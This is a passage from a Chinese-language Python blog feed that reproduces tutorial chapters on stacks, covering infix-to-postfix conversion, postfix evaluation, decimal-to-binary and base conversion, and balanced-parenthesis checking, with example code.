7</em></p><p>所以为了转换表达式，无论是对前缀还是后缀符号，先根据操作的顺序把表达式转换成完全括号表达式。然后将包含的预算符移动到左或右括号的位置，具体取决于需要的前缀或后缀符号。</p><p>这里面有个更复杂的例子， <code>(A + B) * C - (D - E) * (F + G)</code> ，Figure 8显示了如何转换为后缀和前缀。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.9.%E4%B8%AD%E7%BC%80%E5%89%8D%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F/assets/3.9.%E4%B8%AD%E7%BC%80%E5%90%8E%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F.figure8.png" alt="image"></p><p><em>Figure 8</em></p><h4 id="1-中缀转后缀通用法"><a href="#1-中缀转后缀通用法" class="headerlink" title="1.中缀转后缀通用法"></a>1.中缀转后缀通用法</h4><p>我们需要开发一个算法来将任何中缀表达式转换为后缀表达式。为了做到这一点，我们仔细看看转换过程。</p><p>再次考虑表达式 <code>A + B * C</code>。如上所示，<code>A B C * +</code>是等价的后缀表达式。 我们已经注意到，操作数A,B,C保持在它们的相对位置。只有操作符改变位置。再看中缀表达式中的运算符。从左到右出现的第一个运算符为+。然而，在后缀表达式中，+在结束位置，因为下一个运算符*的优先级高于加法。原始表达式中的运算符的顺序在生成的后缀表达式中相反。</p><p>当我们处理表达式时，操作符必须保存在某处，因为它们相应的右操作数还没有看到。此外，这些保存的操作符的顺序可能由于它们的优先级而需要反转。这是在该示例中的加法和乘法的情况。由于加法运算符在乘法运算符之前，并且具有较低的优先级，因此需要在使用乘法运算符之后出现。由于这种顺序的反转，考虑使用栈来保存运算符知道用到它们是有意义的。</p><p><code>(A + B)* C</code>的情况会是什么样呢？ 回想一下，<code>A B + C *</code>是等价的后缀表达式。从左到右处理此中缀表达式，我们先看到 <code>+</code>。 在这种情况下，当我们看到 <code>*</code>，<code>+</code>已经放置在结果表达式中，由于括号它的优先级高于<code>*</code>。 我们现在可以开始看看转换算法如何工作。当我们看到左括号时，我们保存它，表示高优先级的另一个运算符将出现。该操作符需要等到相应的右括号出现以表示其位置（回忆完全括号的算法）。 当右括号出现时，可以从栈中弹出操作符。</p><p>当我们从左到右扫描中缀表达式时，我们将使用栈来保留运算符。这将提供我们在第一个例子中注意到的反转。 堆栈的顶部将始终是最近保存的运算符。每当我们读取一个新的运算符时，我们需要考虑该运算符如何与已经在栈上的运算符（如果有的话）比较优先级。</p><p>假设中缀表达式是一个由空格分隔的标记字符串。 操作符标记是<code>*，/，+</code>和 <code>-</code> ，以及左右括号。操作数是单字符 A，B，C 等。 以下步骤将后缀顺序生成一个字符串。</p><ol><li>创建一个名为opstack的空栈以保存运算符。给输出创建一个空列表。</li><li>通过使用字符串方法拆分将输入的中缀字符串转换为标记列表。</li><li>从左到右扫描标记列表。<ul><li>如果标记是操作数，将其附加到输出列表的末尾、</li><li>如果标记是左括号，将其压到opstack上。</li><li>如果标记是右括号，则弹出opstack，直到删除相应的左括号。将每个预算福附加到输出列表的末尾。</li><li>如果标记是运算符，<code>*，/，+</code>或 <code>-</code> ，将其压入 opstack。但是，首先删除已经在 opstack 中具有更高或相等优先级的任何运算符，并将它们加到输出列表中。</li></ul></li><li>当输入表达式被完全处理时，检查 opstack。仍然在栈上的任何运算符都可以删除并加到输出列表的末尾。</li></ol><p>Figure 9 展示了对表达式 <code>A * B + C * D</code> 的转换算法。注意，第一个 <code>*</code> 在看到 <code>+</code> 运算符时被删除。另外，当第二个 * 出现时， <code>+</code> 保留在栈中，因为乘法优先级高于加法。在中缀表达式的末尾，栈被弹出两次，删除两个运算符，并将 <code>+</code> 作为后缀表达式中的最后一个运算符。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.9.%E4%B8%AD%E7%BC%80%E5%89%8D%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F/assets/3.9.%E4%B8%AD%E7%BC%80%E5%90%8E%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F.figure9.png" alt="image"></p><p><em>Figure 9</em></p><p>为了在 Python 中编写算法，我们使用一个名为 prec 的字典来保存操作符的优先级。这个字典将每个运算符映射到一个整数，可以与其他运算符的优先级（我们使用整数3，2和1）进行比较。左括号将赋予最低的值。这样，与其进行比较的任何运算符将具有更高的优先级，将被放置在它的顶部。第15行将操作数定义为任何大写字符或数字。完整的转换函数见 ActiveCode 1。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pythonds.basic.stack <span class="keyword">import</span> Stack</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">infixToPostfix</span><span class="params">(infixexpr)</span>:</span></div><div class="line">    prec = &#123;&#125;</div><div class="line">    prec[<span class="string">"*"</span>] = <span class="number">3</span></div><div class="line">    prec[<span class="string">"/"</span>] = <span class="number">3</span></div><div class="line">    prec[<span class="string">"+"</span>] = <span class="number">2</span></div><div class="line">    prec[<span class="string">"-"</span>] = <span class="number">2</span></div><div class="line">    prec[<span class="string">"("</span>] = <span class="number">1</span></div><div class="line">    opStack = Stack()</div><div class="line">    postfixList = []</div><div class="line">    tokenList = infixexpr.split()</div><div class="line"></div><div class="line">    <span class="keyword">for</span> token <span class="keyword">in</span> tokenList:</div><div class="line">        <span class="keyword">if</span> token <span class="keyword">in</span> <span class="string">"ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span> <span class="keyword">or</span> token <span class="keyword">in</span> <span class="string">"0123456789"</span>:</div><div class="line">            postfixList.append(token)</div><div class="line">        <span class="keyword">elif</span> token == <span class="string">'('</span>:</div><div class="line">            opStack.push(token)</div><div class="line">        <span class="keyword">elif</span> token == <span class="string">')'</span>:</div><div class="line">            topToken = opStack.pop()</div><div class="line">            <span class="keyword">while</span> topToken != <span class="string">'('</span>:</div><div class="line">                postfixList.append(topToken)</div><div class="line">                topToken = opStack.pop()</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">while</span> (<span class="keyword">not</span> opStack.isEmpty()) <span class="keyword">and</span> \</div><div class="line">               (prec[opStack.peek()] &gt;= prec[token]):</div><div class="line">                  postfixList.append(opStack.pop())</div><div class="line">            opStack.push(token)</div><div class="line"></div><div class="line">    <span class="keyword">while</span> <span class="keyword">not</span> opStack.isEmpty():</div><div class="line">        postfixList.append(opStack.pop())</div><div class="line">    <span class="keyword">return</span> <span class="string">" "</span>.join(postfixList)</div><div class="line"></div><div class="line">print(infixToPostfix(<span class="string">"A * B + C * D"</span>))</div><div class="line">print(infixToPostfix(<span class="string">"( A + B ) * C - ( D - E ) * ( F + G )"</span>))</div></pre></td></tr></table></figure><ol><li>后缀表达式求值</li></ol><p>作为最后栈的示例，我们考虑对后缀符号中的表达式求值。在这种情况下，栈再次是我们选择的数据结构。但是，在扫描后缀表达式时，它必须等待操作数，而不像上面的转换算法中的运算符。解决问题的另一种方法是，每当在输入上看到运算符时，计算两个最近的操作数。</p><p>要详细的了解这一点，考虑后缀表达式<code>4 5 6 * +</code>，首先遇到操作数<code>4</code> 和 <code>5</code>，此时你还不确定如何处理它们，直到看到下一个符号。将它们放置到栈上，确保它们在下一个操作符出现时可用。</p><p>在这种情况下，下一个符号是另一个操作数。所以，像先前一样，压入栈中。并检查下一个符号。现在我们看到操作符<code>*</code>，这意味着需要将两个最近的操作数相乘。通过弹出栈两次，我们可以得到正确的两个操作数，然后执行乘法（这种情况下结果为30）。</p><p>我们现在可以通过将其放回栈中来处理此结果，以便它可以表示为表达式后面的运算符的操作数。当处理最后一个操作符时，栈上只有一个值，弹出并返回它作为表达式的结果。Figure 10展示了整个示例表达式的栈的内容。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.9.%E4%B8%AD%E7%BC%80%E5%89%8D%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F/assets/3.9.%E4%B8%AD%E7%BC%80%E5%90%8E%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F.figure10.png" alt="image"></p><p><em>Figure 10</em></p><p>Figure 11是个稍微复杂的示例，<code>7 8 + 3 2 + /</code> 。在这个例子中有两点需要注意，首先，栈的大小增长收缩，然后在子表达式求值的时候再次增长。第二，除法操作需要自信处理。回想下，后缀表达式的操作符顺序没变，仅仅改变操作符的位置。当用于除法的操作符从栈中弹出时，它们被反转。由于除法不是交换运算符，换句话说<code>15/5</code>和 <code>5/15</code> 不同，因此我们必须保证操作数的顺序不会交换。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.9.%E4%B8%AD%E7%BC%80%E5%89%8D%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F/assets/3.9.%E4%B8%AD%E7%BC%80%E5%90%8E%E7%BC%80%E5%92%8C%E5%90%8E%E7%BC%80%E8%A1%A8%E8%BE%BE%E5%BC%8F.figure11.png" alt="image"></p><p><em>Figure 11</em></p><p>假设后缀表达式是一个由空格分隔的标记字符串。 运算符为<code>*，/，+</code>和 <code>-</code> ，操作数假定为单个整数值。 输出将是一个整数结果。</p><ol><li>创建一个名为 <code>operandStack</code> 的空栈。</li><li>拆分字符串转换为标记列表。</li><li>从左到右扫描标记列表。<ul><li>如果标记是操作数，将其从字符串转换为整数，并将值压到operandStack。</li><li>如果标记是运算符<code>*，/，+</code>或<code>-</code>，它将需要两个操作数。弹出operandStack 两次。 第一个弹出的是第二个操作数，第二个弹出的是第一个操作数。执行算术运算后，将结果压到操作数栈中。</li></ul></li><li>当输入的表达式被完全处理后，结果就在栈上，弹出 operandStack 并返回值。</li></ol><p>用于计算后缀表达式的完整函数见 ActiveCode 2，为了辅助计算，定义了一个函数 doMath, 它将获取两个操作数和运算符，执行相应的计算。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line">+</div><div class="line"></div><div class="line"><span class="keyword">from</span> pythonds.basic.stack <span class="keyword">import</span> Stack</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">postfixEval</span><span class="params">(postfixExpr)</span>:</span></div><div class="line">    operandStack = Stack()</div><div class="line">    tokenList = postfixExpr.split()</div><div class="line"></div><div class="line">    <span class="keyword">for</span> token <span class="keyword">in</span> tokenList:</div><div class="line">        <span class="keyword">if</span> token <span class="keyword">in</span> <span class="string">"0123456789"</span>:</div><div class="line">            operandStack.push(int(token))</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            operand2 = operandStack.pop()</div><div class="line">            operand1 = operandStack.pop()</div><div class="line">            result = doMath(token,operand1,operand2)</div><div class="line">            operandStack.push(result)</div><div class="line">    <span class="keyword">return</span> operandStack.pop()</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">doMath</span><span class="params">(op, op1, op2)</span>:</span></div><div class="line">    <span class="keyword">if</span> op == <span class="string">"*"</span>:</div><div class="line">        <span class="keyword">return</span> op1 * op2</div><div class="line">    <span class="keyword">elif</span> op == <span class="string">"/"</span>:</div><div class="line">        <span class="keyword">return</span> op1 / op2</div><div class="line">    <span class="keyword">elif</span> op == <span class="string">"+"</span>:</div><div class="line">        <span class="keyword">return</span> op1 + op2</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> op1 - op2</div><div class="line"></div><div class="line">print(postfixEval(<span class="string">'7 8 + 3 2 + /'</span>))</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;当你编写一个算术表达式如 &lt;code&gt;B*C&lt;/code&gt; 时，表达式的形式使你能够正确理解它。在这种情况下，你知道 B 乘以 C, 因为乘法运算符 &lt;code&gt;*&lt;/code&gt; 出现在表达式中。这种类型的符号称为中缀，因为运算符在它处理的两个操作数之间。看另外一个中缀示例，&lt;code&gt;A+B*C&lt;/code&gt;，运算符 &lt;code&gt;+&lt;/code&gt; 和 &lt;code&gt;*&lt;/code&gt; 仍然出现在操作数之间。这里面有个问题是，他们分别作用于哪个运算数上，&lt;code&gt;+&lt;/code&gt; 作用于 A 和 B , 还是 &lt;code&gt;*&lt;/code&gt; 作用于 B 和 C？表达式似乎有点模糊。
    
    </summary>
    
      <category term="Python" scheme="http://adamzeng.site/categories/Python/"/>
    
    
      <category term="Python" scheme="http://adamzeng.site/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>十进制转换成二进制</title>
    <link href="http://adamzeng.site/2017/10/27/%E5%8D%81%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%E6%88%90%E4%BA%8C%E8%BF%9B%E5%88%B6/"/>
    <id>http://adamzeng.site/2017/10/27/十进制转换成二进制/</id>
    <published>2017-10-27T09:13:05.000Z</published>
    <updated>2017-10-28T00:25:10.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1-十进制转换成二进制"><a href="#1-十进制转换成二进制" class="headerlink" title="1.十进制转换成二进制"></a>1.十进制转换成二进制</h4><p>二进制在计算机科学中是很重要的，因为存储在计算机内的所有值都是以0和1存储的。如果没有能力在二进制数和普通字符串之间转换，我们与计算机之间的交互非常棘手。<a id="more"></a></p><p>整数值是常见的数据项。他们一直用于计算机程序和计算。我们在数学课上学习它们，当然最后用十进制或者基数10来表示它们。十进制233^10以及对应的二进制表示11101001^2分别解释为</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.8.%E5%8D%81%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%E6%88%90%E4%BA%8C%E8%BF%9B%E5%88%B6/assets/3.8.%E5%8D%81%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%E6%88%90%E4%BA%8C%E8%BF%9B%E5%88%B6.2.png" alt="image"></p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.8.%E5%8D%81%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%E6%88%90%E4%BA%8C%E8%BF%9B%E5%88%B6/assets/3.8.%E5%8D%81%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%E6%88%90%E4%BA%8C%E8%BF%9B%E5%88%B6.1.png" alt="image"></p><p>但是我们如何能够容易地将整数值转换为二进制呢？答案是“除2“算法，它用栈来跟踪二进制结果的数字。</p><p>”除2“算法嘉定我们从大于0的整数开始。不断迭代的将十进制除以2，并跟踪余数。第一个除以2的余数说明了这个值是偶数还是基数。偶数有0的余数，记为0，基数有余数1，记为1.我们将得到的而精致构建为数字序列，第一个余数实际上是序列中的最后一个数字。见Figure 5，我们再次看到了反转的属性，表示栈可能是解决这个问题的数据结构。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.8.%E5%8D%81%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%E6%88%90%E4%BA%8C%E8%BF%9B%E5%88%B6/assets/3.8.%E5%8D%81%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%E6%88%90%E4%BA%8C%E8%BF%9B%E5%88%B6.figure5.png" alt="image"></p><p><em>Figure 5</em></p><p>Activecode 1 中的 Python 代码实现了 “除 2” 算法，函数 divideBy2 传入了一个十进制的参数，并重复除以 2。第 7 行使用内置的模运算符 % 来提取余数，第 8 行将余数压到栈上。当除到 0 后，11-13 行构造了一个二进制字符串。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pythonds.basic.stack <span class="keyword">import</span> Stack</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">divideBy2</span><span class="params">(decNumber)</span>:</span></div><div class="line">    remstack=Stack()</div><div class="line"></div><div class="line">    <span class="keyword">while</span> decNumber&gt;<span class="number">0</span>:</div><div class="line">        rem=decNumber%<span class="number">2</span></div><div class="line">        remstack.push(rem)</div><div class="line">        decNumber=decNumber//<span class="number">2</span></div><div class="line">        </div><div class="line">    binString=<span class="string">""</span></div><div class="line">    <span class="keyword">while</span> <span class="keyword">not</span> remstack.isEmpty():</div><div class="line">        binString=binString+str(remstack.pop())</div><div class="line">        </div><div class="line">    <span class="keyword">return</span> binString</div><div class="line">print(divideBy2(<span class="number">42</span>))</div><div class="line"></div><div class="line"><span class="number">101010</span></div></pre></td></tr></table></figure><p><em>ActiveCode 1</em></p><p>这个用于二进制转换的算法可以很容易的扩展以执行任何基数的转换。在计算机科学中，通常会使用很多不同的编码。其中最常见的是二进制，八进制和十六进制。</p><p>十进制233和它对应的八进制和十六进制351^8,E9^16</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.8.%E5%8D%81%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%E6%88%90%E4%BA%8C%E8%BF%9B%E5%88%B6/assets/3.8.%E5%8D%81%E8%BF%9B%E5%88%B6%E8%BD%AC%E6%8D%A2%E6%88%90%E4%BA%8C%E8%BF%9B%E5%88%B6.3.png" alt="image"></p><p>可以修改divideBy2函数，使它不仅能接受十进制参数，还能接受与其转换的基数。’除2‘的概念被简单的替换成更通用的’除基数‘。在ActiveCode2展示的是一个名为baseConverter函数。采用十进制数和2到16之间的任何技术作为参数。余数部分仍然入栈，直到被转换的值为0。我们创建一组数字，用来表示超过9的余数。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pythonds.basic.stack <span class="keyword">import</span> Stack</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">baseConverter</span><span class="params">(decNumber,base)</span>:</span></div><div class="line">    digits = <span class="string">"0123456789ABCDEF"</span></div><div class="line"></div><div class="line">    remstack = Stack()</div><div class="line"></div><div class="line">    <span class="keyword">while</span> decNumber &gt; <span class="number">0</span>:</div><div class="line">        rem = decNumber % base</div><div class="line">        remstack.push(rem)</div><div class="line">        decNumber = decNumber // base</div><div class="line"></div><div class="line">    newString = <span class="string">""</span></div><div class="line">    <span class="keyword">while</span> <span class="keyword">not</span> remstack.isEmpty():</div><div class="line">        newString = newString + digits[remstack.pop()]</div><div class="line"></div><div class="line">    <span class="keyword">return</span> newString</div><div class="line"></div><div class="line">print(baseConverter(<span class="number">25</span>,<span class="number">2</span>))</div><div class="line">print(baseConverter(<span class="number">25</span>,<span class="number">16</span>))</div></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h4 id=&quot;1-十进制转换成二进制&quot;&gt;&lt;a href=&quot;#1-十进制转换成二进制&quot; class=&quot;headerlink&quot; title=&quot;1.十进制转换成二进制&quot;&gt;&lt;/a&gt;1.十进制转换成二进制&lt;/h4&gt;&lt;p&gt;二进制在计算机科学中是很重要的，因为存储在计算机内的所有值都是以0和1存储的。如果没有能力在二进制数和普通字符串之间转换，我们与计算机之间的交互非常棘手。
    
    </summary>
    
      <category term="Python" scheme="http://adamzeng.site/categories/Python/"/>
    
    
      <category term="Python" scheme="http://adamzeng.site/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>简单与复杂括号匹配</title>
    <link href="http://adamzeng.site/2017/10/27/%E7%AE%80%E5%8D%95%E4%B8%8E%E5%A4%8D%E6%9D%82%E6%8B%AC%E5%8F%B7%E5%8C%B9%E9%85%8D/"/>
    <id>http://adamzeng.site/2017/10/27/简单与复杂括号匹配/</id>
    <published>2017-10-27T09:12:47.000Z</published>
    <updated>2017-10-27T12:27:35.000Z</updated>
    
    <content type="html"><![CDATA[<h4 id="1-简单括号匹配"><a href="#1-简单括号匹配" class="headerlink" title="1.简单括号匹配"></a>1.简单括号匹配</h4><p>我们现在把注意力转向使用栈解决真正的计算机问题。你会这么写算术表达式<a id="more"></a></p><p>(5+6)∗(7+8)/(4+3)</p><p>其中括号用于命令操作的执行。你可能也有一些语言的经验，如Lisp的构造</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">(<span class="name">defun</span> square(<span class="name">n</span>)</div><div class="line">     (<span class="name">*</span> n n))</div></pre></td></tr></table></figure><p>这段代码定义了一个名为square的函数，它将返回参数的n的平方。Lisp使用大量的圆括号是臭名昭著的。</p><p>在这两个例子中，括号必须以匹配的方式出现。括号匹配意味着每个开始符号具有相应的结束符号，并且括号能被正确嵌套。考虑下面正确匹配的括号字符串：</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">(()()()())</div><div class="line"></div><div class="line">(((())))</div><div class="line"></div><div class="line">(()((())()))</div></pre></td></tr></table></figure><figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">((((((())</div><div class="line"></div><div class="line">()))</div><div class="line"></div><div class="line">(()()(()</div></pre></td></tr></table></figure><p>下面是那些不匹配的括号</p><p>区分括号是否匹配的能力是识别很多编程语言结构的重要部分。具有挑战的是如何编写一个算法，能够从左到右读取一串符号，并决定符号是否平衡。为了解决这个问题，我们需要做一个重要的观察。从左到右处理符号时，最近开始符号必须与下一个关闭符号相匹配（见Figure 4）。此外，处理的第一个开始符号必须等待直到其匹配最后一个符号。结束符号以相反的顺序匹配开始符号。他们从内到外匹配。这是一个可以用栈解决问题的线索。</p><p><img src="https://facert.gitbooks.io/python-data-structure-cn/3.%E5%9F%BA%E6%9C%AC%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/3.6.%E7%AE%80%E5%8D%95%E6%8B%AC%E5%8F%B7%E5%8C%B9%E9%85%8D/assets/3.6.%E7%AE%80%E5%8D%95%E6%8B%AC%E5%8F%B7%E5%8C%B9%E9%85%8D.simpleparcheck.png" alt="image"></p><p><em>Figure 4</em></p><p>一旦你认为栈是保存括号的恰当的数据结构，算法是很直接的。从空栈开始，从左到右处理括号字符串。如果一个符号是一个开始符号，将其作为一个信号，对应的结束符号稍后会出现。另一方面，如果符号是结束符号，弹出栈，只要弹出栈的开始符号可以匹配每个结束符号，则括号保持匹配状态。如果任何时候栈上没有出现符合开始符号的结束符号，则字符串不匹配。最后，当所有符号都被处理后，栈应该是空的。实现此算法的Python代码间ActiveCode1.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> test <span class="keyword">import</span> Stack</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">parChecker</span><span class="params">(symbolString)</span>:</span></div><div class="line">    s=Stack()</div><div class="line">    balanced=<span class="keyword">True</span></div><div class="line">    index=<span class="number">0</span></div><div class="line">    <span class="keyword">while</span> index&lt;len(symbolString) <span class="keyword">and</span> balanced:</div><div class="line">        symbol=symbolString[index]</div><div class="line">        <span class="keyword">if</span> symbol==<span class="string">'('</span>:</div><div class="line">            s.push(symbol)</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">            <span class="keyword">if</span> s.isEmpty():</div><div class="line">                balanced=<span class="keyword">False</span></div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                s.pop()</div><div class="line">        index=index+<span class="number">1</span></div><div class="line">        </div><div class="line">    <span class="keyword">if</span> balanced <span class="keyword">and</span> s.isEmpty():</div><div class="line">        <span class="keyword">return</span> <span class="keyword">True</span></div><div class="line">    <span class="keyword">else</span>:</div><div class="line">        <span class="keyword">return</span> <span class="keyword">False</span></div><div class="line">      </div><div class="line">print(parChecker(<span class="string">'((()))'</span>))</div><div class="line">print(parChecker(<span class="string">'(()'</span>))</div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">True</span></div><div class="line"><span class="keyword">False</span></div></pre></td></tr></table></figure><h4 id="2-复杂符号匹配"><a href="#2-复杂符号匹配" class="headerlink" title="2.复杂符号匹配"></a>2.复杂符号匹配</h4><p>上面显示的匹配括号问题是许多编程语言都会出现的一般情况的特定情况。匹配和嵌套不同种类的开始和结束符号的情况经常发生。例如，在Python中，方括号[和]用于列表，花括号{和}用于字典。括号（和）用于元祖和算术表达式。只要每个符号都能保持自己的开始和结束关系，就可以混合符号。</p><p>符号字符串如</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&#123; &#123; ( [ ] [ ] ) &#125; ( ) &#125;</div><div class="line"></div><div class="line">[ [ &#123; &#123; ( ( ) ) &#125; &#125; ] ]</div><div class="line"></div><div class="line">[ ] [ ] [ ] ( ) &#123; &#125;</div></pre></td></tr></table></figure><p>这些被恰当匹配了，因为不仅每一个开始符号都有对应的结束符号，而且符号的类型也匹配。</p><p>相反这些字符串没法匹配：</p><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">( [ ) ]</div><div class="line"></div><div class="line">( ( ( ) ] ) )</div><div class="line"></div><div class="line">[ &#123; ( ) ]</div></pre></td></tr></table></figure><p>上节简单括号检查程序可以轻松扩展处理这些新类型的符号。回想一下，每个开始符号被简单的压入栈中，等待匹配的结束符号出现。当出现结束符号时。唯一的区别是我们必须检查确保它正确匹配栈顶部开始符号的类型。如果两个符号不匹配，则字符串不匹配。如果整个字符串都被处理完并且没有什么留在栈中，则字符串匹配。</p><p>Python程序见ActiveCode 1。唯一的变化是16行，我们称之为辅助函数匹配。必须检查栈中每个删除的符号，以查看它是否与当前结束符号匹配。如果不匹配，则布尔变量balanced被设置为False。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> pythonds.basic.stack <span class="keyword">import</span> Stack</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span 